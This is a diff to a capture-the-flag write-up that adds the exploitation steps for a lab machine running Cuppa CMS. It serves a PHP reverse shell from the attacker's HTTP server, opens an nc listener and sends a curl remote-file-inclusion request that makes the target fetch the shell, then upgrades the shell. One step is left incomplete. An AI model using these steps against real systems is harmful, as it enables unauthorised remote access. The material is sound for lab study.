@@ -251,11 +251,48 @@ administrator           [Status: 301, Size: 339, Words: 20, Lines: 10, Duration:
 
 ### Exploitation
 
-Administrator Page shows its a cuppa CMS and by using `searchsploit cuppa cms` we found a potentials RFI vulnerability have give us initial foothold.
-
+Administrator Page shows its a cuppa CMS and by using `searchsploit cuppa cms` we found a potentials RFI vulnerability that give us initial foothold.
+first we have to make `shell.php` file that have php reverse shell code I use PentestMonkey Php Reverse shell code so you can use that also.
+After that we have to serve that file with any http server I use `python3` HTTP server using the following command.
+```shell
+python3 -m http.server 80
+```
+> **Note**: Use this command on the same directory where your php reverse shell file exits
+After that we have to start our listener to catch reverse shell. We can do that with the following command.
+```shell
+nc -lvnp 4444
+```
+Now we are ready to launch our exploit. We can launch our attack with `curl` or manually using browser.
 ```shell
 curl http://10.10.108.117/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://$ip/shell.php
 ```
+##### Upgrade Shell
+
+If every thing goes well now you should have a reverse shell. So now we have to upgrade that shell with higher pty shell so we can use it like our normal
+shell. Just follow the following command.
+```shell
+python3 -c "import pty;pty.spawn('/bin/bash')"
+```
+When you run above command in your reverse shell you should see your shell looks a little bit better but they are not that good right now so we have make it more better.
+Press `CTRL + Z` shortcut key of your keyboard. This will background your reverse shell.
+After that use the following command.
+
+Press `Enter` key twice and now you can use `CTRL+C` to kill your processes not your shell.
+But there is one more step we have to do. Just Copy paste all the following command in your reverse shell.
+```shell
+export TERM=x-term256color
+stty raw -echo;fg
+alias diff='diff --color=auto'
+alias egrep='egrep --color=auto'
+alias fgrep='fgrep --color=auto'
+alias grep='grep --color=auto'
+alias ip='ip --color=auto'
+alias l='ls -CF'
+alias la='ls -A'
+alias ll='ls -l'
+alias ls='ls --color=auto'
+```
+Now you should have a Reverse Shell That looks like a SSH Shell.
 
 ### Privilege Escalation
 
